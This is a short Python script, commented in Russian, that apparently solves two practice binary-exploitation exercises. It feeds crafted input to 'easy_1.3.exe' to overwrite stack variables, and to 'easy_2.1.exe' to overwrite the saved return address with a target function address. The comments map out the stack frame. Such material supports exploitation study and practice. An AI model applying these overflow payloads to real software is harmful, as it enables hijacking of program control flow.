from subprocess import PIPE, Popen

data = b"-"*48 + b"\x03\x00\x00\x00"

p1 = Popen("easy_1.3.exe", stdin=PIPE)
p1.communicate(data)
p1.wait()

# buffer size = 64 байт
# var_10 - 48 байт от вершины
# var_E - 50 байтов от вершины

# на rbp+var_10 = 3
# на rbp+var_E = 0

# var_10 - var_E = 3
data = b"-"*40 + b"\x60\x13\x00\x40\x01\x00\x00\x00" # text:0000000140001360 <- target

p1 = Popen("easy_2.1.exe", stdin=PIPE)
p1.communicate(data)
p1.wait()
# [rbp+8] -> адрес возврата
# [rbp+0] -> сохранённое значение `rbp`
# [rbp-20h] -> начало буфера